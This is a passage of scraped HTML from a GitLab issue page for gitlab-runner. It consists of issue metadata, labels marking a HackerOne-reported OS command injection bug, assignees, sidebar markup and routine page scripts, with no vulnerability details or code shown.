pipelines.&quot;,&quot;time_estimate&quot;:0,&quot;total_time_spent&quot;:0,&quot;human_time_estimate&quot;:null,&quot;human_total_time_spent&quot;:null,&quot;state&quot;:&quot;closed&quot;,&quot;milestone_id&quot;:2453027,&quot;updated_by_id&quot;:4992072,&quot;created_at&quot;:&quot;2020-12-30T20:40:19Z&quot;,&quot;updated_at&quot;:&quot;2023-09-29T21:10:56Z&quot;,&quot;milestone&quot;:{&quot;id&quot;:2453027,&quot;iid&quot;:77,&quot;group_id&quot;:9970,&quot;title&quot;:&quot;15.5&quot;,&quot;description&quot;:&quot;&quot;,&quot;state&quot;:&quot;closed&quot;,&quot;created_at&quot;:&quot;2022-02-03T22:29:56.909Z&quot;,&quot;updated_at&quot;:&quot;2024-01-11T08:44:25.515Z&quot;,&quot;due_date&quot;:&quot;2022-10-17&quot;,&quot;start_date&quot;:&quot;2022-09-18&quot;,&quot;expired&quot;:true,&quot;web_url&quot;:&quot;https://gitlab.com/groups/gitlab-org/-/milestones/77&quot;},&quot;labels&quot;:[{&quot;id&quot;:23051569,&quot;title&quot;:&quot;Category:Runner Core&quot;,&quot;color&quot;:&quot;#428BCA&quot;,&quot;description&quot;:&quot;https://about.gitlab.com/direction/verify/runner_core/&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2021-12-19T16:01:48.638Z&quot;,&quot;updated_at&quot;:&quot;2022-08-01T15:44:20.702Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3417347,&quot;title&quot;:&quot;HackerOne&quot;,&quot;color&quot;:&quot;#0033CC&quot;,&quot;description&quot;:&quot;&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-01-31T13:53:42.609Z&quot;,&quot;updated_at&quot;:&quot;2019-01-09T12:13:21.325Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2148612,&quot;title&quot;:&quot;OKR-FY24Q2&quot;,&quot;color&quot;:&quot;#ff0000&quot;,&quot;description&quot;:&quot;https://about.gitlab.com/okrs/&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-06-14T09:32:41.204Z&quot;,&quot;updated_at&quot;:&quot;2023-07-27T09:36:28.352Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:10413872,&quot;title&quot;:&quot;SLO::Missed&quot;,&quot;color&quot;:&quot;#CC0000&quot;,&quot;description&quot;:&quot;Label to signify that a bug issue has missed its targeted SLO (Service Level Objective). See https://docs.gitlab.com/ee/development/contributing/issue_workflow.html#priority-labels. Previously titled as missed-SLO&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2019-04-28T18:18:21.631Z&quot;,&quot;updated_at&quot;:&quot;2023-02-16T18:38:39.684Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:17628825,&quot;title&quot;:&quot;Weakness::CWE-78&quot;,&quot;color&quot;:&quot;#7F8C8D&quot;,&quot;description&quot;:&quot;OS Command Injection&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2020-12-30T20:40:19.224Z&quot;,&quot;updated_at&quot;:&quot;2020-12-30T20:40:19.224Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:4107753,&quot;title&quot;:&quot;bug::vulnerability&quot;,&quot;color&quot;:&quot;#CC0000&quot;,&quot;description&quot;:&quot;A security vulnerability&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-05-22T15:15:09.960Z&quot;,&quot;updated_at&quot;:&quot;2022-03-16T11:32:16.336Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3103453,&quot;title&quot;:&quot;devops::verify&quot;,&quot;color&quot;:&quot;#E44D2A&quot;,&quot;description&quot;:&quot;Issues for the Verify stage of the DevOps lifecycle (e.g. CI, Code Quality, Usability Testing)&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-12-01T19:02:20.643Z&quot;,&quot;updated_at&quot;:&quot;2022-05-11T06:40:55.050Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:11448658,&quot;title&quot;:&quot;group::runner&quot;,&quot;color&quot;:&quot;#A8D695&quot;,&quot;description&quot;:&quot;Issues belonging to the Runner group of the Verify stage of the DevOps lifecycle.&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2019-07-25T09:43:07.346Z&quot;,&quot;updated_at&quot;:&quot;2019-07-25T09:43:07.346Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3857523,&quot;title&quot;:&quot;priority::2&quot;,&quot;color&quot;:&quot;#ff8800&quot;,&quot;description&quot;:&quot;We will address this soon and will provide capacity from our team for it in the next few releases. See https://handbook.gitlab.com/handbook/engineering/infrastructure/engineering-productivity/issue-triage/#priority&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2018-04-13T08:01:55.497Z&quot;,&quot;updated_at&quot;:&quot;2024-04-01T13:23:35.254Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:13979951,&quot;title&quot;:&quot;section::ops&quot;,&quot;color&quot;:&quot;#F0AD4E&quot;,&quot;description&quot;:&quot;Any issues related to the Ops Section&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2020-02-25T18:55:27.372Z&quot;,&quot;updated_at&quot;:&quot;2020-02-25T18:56:44.743Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2779335,&quot;title&quot;:&quot;security&quot;,&quot;color&quot;:&quot;#d9534f&quot;,&quot;description&quot;:&quot;Issues related to the security of GitLab or its dependencies. Please report vulnerabilities responsibly per https://about.gitlab.com/security/disclosure/&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-10-05T14:36:39.341Z&quot;,&quot;updated_at&quot;:&quot;2023-05-24T20:20:05.269Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3713902,&quot;title&quot;:&quot;severity::2&quot;,&quot;color&quot;:&quot;#ff8800&quot;,&quot;description&quot;:&quot;Critical - applies to bugs and bug categories of availability, performance, security and ux. See https://handbook.gitlab.com/handbook/engineering/infrastructure/engineering-productivity/issue-triage/#severity&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2018-03-23T14:46:34.880Z&quot;,&quot;updated_at&quot;:&quot;2024-04-01T13:12:15.351Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2278648,&quot;title&quot;:&quot;type::bug&quot;,&quot;color&quot;:&quot;#cc0000&quot;,&quot;description&quot;:&quot;Issues that report undesirable or incorrect behavior. See https://handbook.gitlab.com/handbook/product/groups/product-analysis/engineering/metrics/#work-type-classification&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-07-07T20:20:34.868Z&quot;,&quot;updated_at&quot;:&quot;2024-11-08T09:52:16.699Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:11838120,&quot;title&quot;:&quot;workflow::production&quot;,&quot;color&quot;:&quot;#428BCA&quot;,&quot;description&quot;:&quot;Merge request has been deployed to GitLab.com&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2019-08-21T12:05:06.918Z&quot;,&quot;updated_at&quot;:&quot;2019-08-22T12:18:15.680Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false}],&quot;lock_version&quot;:8,&quot;author_id&quot;:2741139,&quot;confidential&quot;:false,&quot;discussion_locked&quot;:null,&quot;assignees&quot;:[{&quot;id&quot;:3385446,&quot;username&quot;:&quot;zeffmorgan&quot;,&quot;name&quot;:&quot;Zeff Morgan&quot;,&quot;state&quot;:&quot;blocked&quot;,&quot;locked&quot;:false,&quot;avatar_url&quot;:&quot;https://gitlab.com/uploads/-/system/user/avatar/3385446/avatar.png&quot;,&quot;web_url&quot;:&quot;https://gitlab.com/zeffmorgan&quot;},{&quot;id&quot;:4903108,&quot;username&quot;:&quot;ggeorgiev_gitlab&quot;,&quot;name&quot;:&quot;Georgi N. Georgiev&quot;,&quot;state&quot;:&quot;active&quot;,&quot;locked&quot;:false,&quot;avatar_url&quot;:&quot;https://secure.gravatar.com/avatar/d2189187f4fef769508fc45200db57168431557e367631fbbeee519edfce0c37?s=80\u0026d=identicon&quot;,&quot;web_url&quot;:&quot;https://gitlab.com/ggeorgiev_gitlab&quot;},{&quot;id&quot;:10422156,&quot;username&quot;:&quot;alyubenkov&quot;,&quot;name&quot;:&quot;Aleksandr Lyubenkov&quot;,&quot;state&quot;:&quot;blocked&quot;,&quot;locked&quot;:false,&quot;avatar_url&quot;:&quot;https://gitlab.com/uploads/-/system/user/avatar/10422156/avatar.png&quot;,&quot;web_url&quot;:&quot;https://gitlab.com/alyubenkov&quot;}],&quot;due_date&quot;:null,&quot;project_id&quot;:250833,&quot;moved_to_id&quot;:null,&quot;duplicated_to_id&quot;:null,&quot;web_url&quot;:&quot;/gitlab-org/gitlab-runner/-/issues/27386&quot;,&quot;current_user&quot;:{&quot;can_create_note&quot;:false,&quot;can_create_confidential_note&quot;:false,&quot;can_update&quot;:false,&quot;can_set_issue_metadata&quot;:false,&quot;can_award_emoji&quot;:false},&quot;create_note_path&quot;:&quot;/gitlab-org/gitlab-runner/notes?target_id=76597290\u0026target_type=issue&quot;,&quot;preview_note_path&quot;:&quot;/gitlab-org/gitlab-runner/-/preview_markdown?target_id=27386\u0026target_type=Issue&quot;,&quot;is_project_archived&quot;:false,&quot;issue_email_participants&quot;:[],&quot;type&quot;:&quot;ISSUE&quot;,&quot;weight&quot;:null,&quot;blocked&quot;:false,&quot;blocked_by_issues&quot;:[]}" data-noteable-type="Issue" data-notes-data="{&quot;noteableType&quot;:&quot;issue&quot;,&quot;noteableId&quot;:76597290,&quot;projectId&quot;:250833,&quot;groupId&quot;:null,&quot;discussionsPath&quot;:&quot;/gitlab-org/gitlab-runner/-/issues/27386/discussions.json&quot;,&quot;registerPath&quot;:&quot;/users/sign_up?redirect_to_referer=yes&quot;,&quot;newSessionPath&quot;:&quot;/users/sign_in?redirect_to_referer=yes&quot;,&quot;markdownDocsPath&quot;:&quot;/help/user/markdown.md&quot;,&quot;quickActionsDocsPath&quot;:&quot;/help/user/project/quick_actions.md&quot;,&quot;closePath&quot;:&quot;/gitlab-org/gitlab-runner/-/issues/27386.json?issue%5Bstate_event%5D=close&quot;,&quot;reopenPath&quot;:&quot;/gitlab-org/gitlab-runner/-/issues/27386.json?issue%5Bstate_event%5D=reopen&quot;,&quot;notesPath&quot;:&quot;/gitlab-org/gitlab-runner/noteable/issue/76597290/notes&quot;,&quot;prerenderedNotesCount&quot;:10,&quot;lastFetchedAt&quot;:1736097278000000,&quot;notesFilter&quot;:null}" data-notes-filters="{&quot;Show all activity&quot;:0,&quot;Show comments only&quot;:1,&quot;Show history only&quot;:2}" data-report-abuse-path="/-/abuse_reports/add_category" data-show-timeline-view-toggle="false" data-target-type="issue" id="js-vue-notes"></div>
</section>

</div>
</div>
<aside aria-label="issue" aria-live="polite" class="right-sidebar js-right-sidebar js-issuable-sidebar right-sidebar-expanded" data-always-show-toggle data-auto-collapse data-issuable-type="issue">
<div class="issuable-sidebar">
<div class="issuable-sidebar-header">
<button class="gl-button btn btn-md btn-default gutter-toggle gl-float-right js-sidebar-toggle has-tooltip !gl-border-0" type="button" aria-label="Toggle sidebar" title="Collapse sidebar" data-container="body" data-placement="left" data-boundary="viewport" type="button"><span class="gl-button-text">
<span class="js-sidebar-toggle-container gl-button-text" data-is-expanded="true"><svg class="s16 js-sidebar-expand hidden" data-testid="chevron-double-lg-left-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#chevron-double-lg-left"></use></svg><svg class="s16 js-sidebar-collapse " data-testid="chevron-double-lg-right-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#chevron-double-lg-right"></use></svg></span>

</span>

</button></div>
<form class="issuable-context-form inline-update js-issuable-update " action="/gitlab-org/gitlab-runner/-/issues/27386.json" accept-charset="UTF-8" data-remote="true" method="post"><div class="block assignee gl-mt-3" data-testid="assignee-block-container">
<div class="js-sidebar-assignees-root" data-field="issue" data-max-assignees="200">
<div class="title hide-collapsed gl-flex gl-justify-between gl-items-center !gl-mb-0">
<span class="gl-font-bold">Assignee</span>
<span class="gl-spinner-container" role="status"><span aria-hidden class="gl-spinner gl-spinner-sm gl-spinner-dark !gl-align-text-bottom"></span><span class="gl-sr-only !gl-absolute">Loading</span>
</span>
</div>
</div>

</div>
<div class="block epic" data-testid="sidebar-epic">
<div class="js-sidebar-epic-widget-root" data-can-edit="false" data-group-path="gitlab-org" data-issue-id="76597290" data-issue-iid="27386" data-project-path="gitlab-org/gitlab-runner"></div>
</div>

<div class="js-sidebar-labels-widget-root" data-allow-label-create="" data-allow-scoped-labels="true" data-can-edit="" data-iid="27386" data-issuable-type="issue" data-labels-fetch-path="/gitlab-org/gitlab-runner/-/labels.json?include_ancestor_groups=true" data-labels-manage-path="/gitlab-org/gitlab-runner/-/labels" data-project-issues-path="/gitlab-org/gitlab-runner/-/issues" data-project-path="gitlab-org/gitlab-runner" data-selected-labels="[{&quot;id&quot;:23051569,&quot;title&quot;:&quot;Category:Runner Core&quot;,&quot;color&quot;:&quot;#428BCA&quot;,&quot;description&quot;:&quot;https://about.gitlab.com/direction/verify/runner_core/&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2021-12-19T16:01:48.638Z&quot;,&quot;updated_at&quot;:&quot;2022-08-01T15:44:20.702Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3417347,&quot;title&quot;:&quot;HackerOne&quot;,&quot;color&quot;:&quot;#0033CC&quot;,&quot;description&quot;:&quot;&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-01-31T13:53:42.609Z&quot;,&quot;updated_at&quot;:&quot;2019-01-09T12:13:21.325Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2148612,&quot;title&quot;:&quot;OKR-FY24Q2&quot;,&quot;color&quot;:&quot;#ff0000&quot;,&quot;description&quot;:&quot;https://about.gitlab.com/okrs/&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-06-14T09:32:41.204Z&quot;,&quot;updated_at&quot;:&quot;2023-07-27T09:36:28.352Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:10413872,&quot;title&quot;:&quot;SLO::Missed&quot;,&quot;color&quot;:&quot;#CC0000&quot;,&quot;description&quot;:&quot;Label to signify that a bug issue has missed its targeted SLO (Service Level Objective). See https://docs.gitlab.com/ee/development/contributing/issue_workflow.html#priority-labels. Previously titled as missed-SLO&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2019-04-28T18:18:21.631Z&quot;,&quot;updated_at&quot;:&quot;2023-02-16T18:38:39.684Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:17628825,&quot;title&quot;:&quot;Weakness::CWE-78&quot;,&quot;color&quot;:&quot;#7F8C8D&quot;,&quot;description&quot;:&quot;OS Command Injection&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2020-12-30T20:40:19.224Z&quot;,&quot;updated_at&quot;:&quot;2020-12-30T20:40:19.224Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:4107753,&quot;title&quot;:&quot;bug::vulnerability&quot;,&quot;color&quot;:&quot;#CC0000&quot;,&quot;description&quot;:&quot;A security vulnerability&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-05-22T15:15:09.960Z&quot;,&quot;updated_at&quot;:&quot;2022-03-16T11:32:16.336Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3103453,&quot;title&quot;:&quot;devops::verify&quot;,&quot;color&quot;:&quot;#E44D2A&quot;,&quot;description&quot;:&quot;Issues for the Verify stage of the DevOps lifecycle (e.g. CI, Code Quality, Usability Testing)&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-12-01T19:02:20.643Z&quot;,&quot;updated_at&quot;:&quot;2022-05-11T06:40:55.050Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:11448658,&quot;title&quot;:&quot;group::runner&quot;,&quot;color&quot;:&quot;#A8D695&quot;,&quot;description&quot;:&quot;Issues belonging to the Runner group of the Verify stage of the DevOps lifecycle.&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2019-07-25T09:43:07.346Z&quot;,&quot;updated_at&quot;:&quot;2019-07-25T09:43:07.346Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3857523,&quot;title&quot;:&quot;priority::2&quot;,&quot;color&quot;:&quot;#ff8800&quot;,&quot;description&quot;:&quot;We will address this soon and will provide capacity from our team for it in the next few releases. See https://handbook.gitlab.com/handbook/engineering/infrastructure/engineering-productivity/issue-triage/#priority&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2018-04-13T08:01:55.497Z&quot;,&quot;updated_at&quot;:&quot;2024-04-01T13:23:35.254Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:13979951,&quot;title&quot;:&quot;section::ops&quot;,&quot;color&quot;:&quot;#F0AD4E&quot;,&quot;description&quot;:&quot;Any issues related to the Ops Section&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2020-02-25T18:55:27.372Z&quot;,&quot;updated_at&quot;:&quot;2020-02-25T18:56:44.743Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2779335,&quot;title&quot;:&quot;security&quot;,&quot;color&quot;:&quot;#d9534f&quot;,&quot;description&quot;:&quot;Issues related to the security of GitLab or its dependencies. Please report vulnerabilities responsibly per https://about.gitlab.com/security/disclosure/&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-10-05T14:36:39.341Z&quot;,&quot;updated_at&quot;:&quot;2023-05-24T20:20:05.269Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3713902,&quot;title&quot;:&quot;severity::2&quot;,&quot;color&quot;:&quot;#ff8800&quot;,&quot;description&quot;:&quot;Critical - applies to bugs and bug categories of availability, performance, security and ux. See https://handbook.gitlab.com/handbook/engineering/infrastructure/engineering-productivity/issue-triage/#severity&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2018-03-23T14:46:34.880Z&quot;,&quot;updated_at&quot;:&quot;2024-04-01T13:12:15.351Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2278648,&quot;title&quot;:&quot;type::bug&quot;,&quot;color&quot;:&quot;#cc0000&quot;,&quot;description&quot;:&quot;Issues that report undesirable or incorrect behavior. See https://handbook.gitlab.com/handbook/product/groups/product-analysis/engineering/metrics/#work-type-classification&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-07-07T20:20:34.868Z&quot;,&quot;updated_at&quot;:&quot;2024-11-08T09:52:16.699Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:11838120,&quot;title&quot;:&quot;workflow::production&quot;,&quot;color&quot;:&quot;#428BCA&quot;,&quot;description&quot;:&quot;Merge request has been deployed to GitLab.com&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2019-08-21T12:05:06.918Z&quot;,&quot;updated_at&quot;:&quot;2019-08-22T12:18:15.680Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false}]"></div>
<div class="block milestone" data-testid="sidebar-milestones">
<div class="js-sidebar-milestone-widget-root" data-can-edit="" data-issue-iid="27386" data-project-path="gitlab-org/gitlab-runner"></div>
</div>
<div class="block" data-testid="iteration-container"><div class="js-sidebar-iteration-widget-root" data-can-edit="" data-group-path="gitlab-org" data-issue-id="76597290" data-issue-iid="27386" data-project-path="gitlab-org/gitlab-runner"></div>
</div>
<div class="js-sidebar-weight-widget-root" data-can-edit="" data-issue-iid="27386" data-project-path="gitlab-org/gitlab-runner"></div>

<div class="js-sidebar-due-date-widget-root"></div>
<div class="js-sidebar-time-tracking-root block">
<!-- / Fallback while content is loading -->
<div class="title hide-collapsed gl-flex gl-justify-between gl-items-center !gl-mb-0">
<span class="gl-font-bold">Time tracking</span>
<span class="gl-spinner-container" role="status"><span aria-hidden class="gl-spinner gl-spinner-sm gl-spinner-dark !gl-align-text-bottom"></span><span class="gl-sr-only !gl-absolute">Loading</span>
</span>
</div>
</div>
<div class="js-sidebar-health-status-widget-root" data-can-edit="" data-full-path="gitlab-org/gitlab-runner" data-iid="27386" data-issuable-type="issue"></div>
<script id="js-confidential-issue-data" type="application/json">{"is_confidential":false,"is_editable":null}</script>
<div class="block">
<div class="hide-collapsed gl-flex gl-items-center gl-font-bold gl-leading-20 gl-text-default">
Confidentiality
</div>
<div class="hide-collapsed gl-text-subtle">
Confidentiality controls have moved to the issue actions menu (<svg class="s12 gl-align-middle" data-testid="ellipsis_v-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#ellipsis_v"></use></svg>) at the top of the page.
</div>
</div>

<div class="js-sidebar-participants-widget-root"></div>
</form><script class="js-sidebar-options" type="application/json">{"endpoint":"/gitlab-org/gitlab-runner/-/issues/27386.json?serializer=sidebar_extras","toggleSubscriptionEndpoint":"/gitlab-org/gitlab-runner/-/issues/27386/toggle_subscription","moveIssueEndpoint":"/gitlab-org/gitlab-runner/-/issues/27386/move","projectsAutocompleteEndpoint":"/-/autocomplete/projects?project_id=250833","editable":"","currentUser":{},"rootPath":"/","fullPath":"gitlab-org/gitlab-runner","iid":27386,"id":76597290,"severity":"unknown","timeTrackingLimitToHours":true,"canCreateTimelogs":null,"createNoteEmail":null,"issuableType":"issue","directlyInviteMembers":"false","weightOptions":["None","Any",0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20],"weightNoneValue":"None","multipleApprovalRulesAvailable":null}</script>
</div>
</aside>



</main>
</div>


</div>
</div>


<script nonce="fvcHCvwWdzQcfbsOr86N7w==">
//<![CDATA[
if ('loading' in HTMLImageElement.prototype) {
  document.querySelectorAll('img.lazy').forEach(img => {
    img.loading = 'lazy';
    let imgUrl = img.dataset.src;
    // Only adding width + height for avatars for now
    if (imgUrl.indexOf('/avatar/') > -1 && imgUrl.indexOf('?') === -1) {
      const targetWidth = img.getAttribute('width') || img.width;
      imgUrl += `?width=${targetWidth}`;
    }
    img.src = imgUrl;
    img.removeAttribute('data-src');
    img.classList.remove('lazy');
    img.classList.add('js-lazy-loaded');
    img.dataset.testid = 'js-lazy-loaded-content';
  });
}

//]]>
</script>
<script nonce="fvcHCvwWdzQcfbsOr86N7w==">
//<![CDATA[
gl = window.gl || {};
gl.experiments = {};


//]]>
</script>

</body>
</html>

